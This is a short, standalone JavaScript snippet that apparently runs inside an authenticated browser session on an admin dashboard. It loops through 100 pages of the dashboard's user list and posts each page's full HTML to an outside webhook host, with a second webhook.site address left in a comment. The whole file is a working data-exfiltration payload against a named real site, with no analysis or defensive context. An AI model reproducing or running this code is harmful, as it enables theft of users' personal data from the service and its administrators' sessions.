
for (let i = 0; i < 100; i++) {
  
   await new Promise(r => setTimeout(r, 1500));
  
  var xhr = new XMLHttpRequest();
  xhr.open('GET', "https://haatadmindashboard.azurewebsites.net/admin/getusers?sort=true&draw=1&AreaId=0&start="+i*100+"&lentgh=100", true);
  xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {

          var http = new XMLHttpRequest();
         // var url = "https://webhook.site/3d15bff1-d379-4b33-a0af-b95f18e0e0f9/"+i;
          var url = "https://webhookteset.com/"+i;
          http.open("POST", url, true);
          http.setRequestHeader("Content-type", "text/plain");
  
          page_data = {
                    "page_html": xhr.responseText,
                    "uri": 'users'+i
                };
        http.send(JSON.stringify(page_data));

            } //if ==4
        
}; //ready xhr

xhr.send(null);  
  
} //for


